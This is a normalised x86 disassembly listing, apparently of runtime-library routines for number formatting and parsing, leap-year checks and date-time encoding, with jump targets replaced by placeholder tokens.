mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_40a614
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_409830
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
mov edx [ ebp + 0x8 ]
movzx edx [ edx + 0x4 ]
jmp r-xdata
mov bl 0x4
sub_40ad28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40a308
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_40a634
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_40ad68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40a308
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_40a634
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40add4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx 0x1000
mov edx [ ebp - 0x4 ]
mov eax edx
test eax eax
je r-xdata
cmp eax 0xc00
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edx
test eax eax
je r-xdata
mov eax edx
test eax eax
je r-xdata
mov ebx eax
mov [ ebp - 0xc ] ebx
sub eax 0x4
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x100c ]
mov edx 0xfff
call sub_40a634
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x100c ]
mov eax edi
mov ecx [ ebp - 0xc ]
call sub_404f34
jmp r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jg r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jle r-xdata
add ebx ebx
mov eax edi
call sub_404e44
mov eax edi
mov edx ebx
call sub_4055ac
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax edi
mov edx [ ebp - 0xc ]
call sub_4055ac
jmp r-xdata
push esi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ edi ]
call sub_40a634
mov [ ebp - 0xc ] eax
sub esi 0x4
mov esi [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40aeb0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx 0x1000
mov edx [ ebp - 0x4 ]
mov eax edx
test eax eax
je r-xdata
cmp eax 0xc00
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edx
test eax eax
je r-xdata
mov eax edx
test eax eax
je r-xdata
mov ebx eax
mov [ ebp - 0xc ] ebx
sub eax 0x4
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x100c ]
mov edx 0xfff
call sub_40a9ac
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x100c ]
mov eax edi
mov ecx [ ebp - 0xc ]
call sub_404f34
jmp r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jg r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jle r-xdata
add ebx ebx
mov eax edi
call sub_404e44
mov eax edi
mov edx ebx
call sub_4055ac
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax edi
mov edx [ ebp - 0xc ]
call sub_4055ac
jmp r-xdata
push esi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ edi ]
call sub_40a9ac
mov [ ebp - 0xc ] eax
sub esi 0x4
mov esi [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40af94
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_40afd8
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_40b584
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40b0d7
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_40b0e1
call sub_40b0d7
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40af94
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_40b13d
call sub_40b0d7
call sub_40b0ce
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_40b0ce
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40af94
retn
xor ecx ecx
sub_40b179
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40b0ce
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40b0ce
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40b1de
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40b232
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_40b179
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_40b2ac
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax + 0x3 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp + 0x8 ]
mov al [ eax + 0x2 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x8 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0x10 ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x14 ] 0x2
jb r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_40b584
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x14 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40b3af
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0x10
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
sub_40b3b9
call sub_40b3af
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0x10 ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40af94
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_40b415
call sub_40b3af
call sub_40b3a6
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0x10 ]
dec ecx
call sub_40b3a6
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0xc ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40af94
retn
xor ecx ecx
sub_40b451
mov edx [ ebp + 0xc ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x14 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40b3a6
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40b3a6
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40b4b6
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40b50a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_40b451
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_40b584
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_40b5b1
jmp r-xdata
call sub_40b6d3
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_40b5b1
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_403a40
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40b6d3
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_40b7b0
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40b867
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40b872
neg edx
mov ecx esi
call sub_40b872
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40b867
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40b88e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_403a40
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40b872
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40b88e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40b8c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_40afd8
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404f34
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40b8f4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_40afd8
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404f34
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40b924
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push ebx
push esi
push edi
lea edx [ ebp + 0xc ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_40afd8
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax [ ebp + 0x8 ]
call sub_404f34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_40b978
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_405324
mov edx esp
xor ecx ecx
call sub_40b7b0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40b9a4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_405324
mov edx esp
xor ecx ecx
call sub_40b7b0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40b9ec
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_40ba30
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_40baa0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40ba30
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_408fa8
sub_40bae0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40b9ec
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_408f8c
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_408f8c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_408f8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40bb3c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_40bb78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
movzx eax [ ebp - 0x2 ]
call sub_40bb3c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
movzx eax [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_40bc44
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_40bb78
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_408fa8
sub_40bc74
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40b9ec
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_408f8c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_408f8c
movzx eax [ ebp - 0x10 ]
add eax eax
add eax eax
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_408f8c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40bb3c
mov edx eax
movzx eax dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
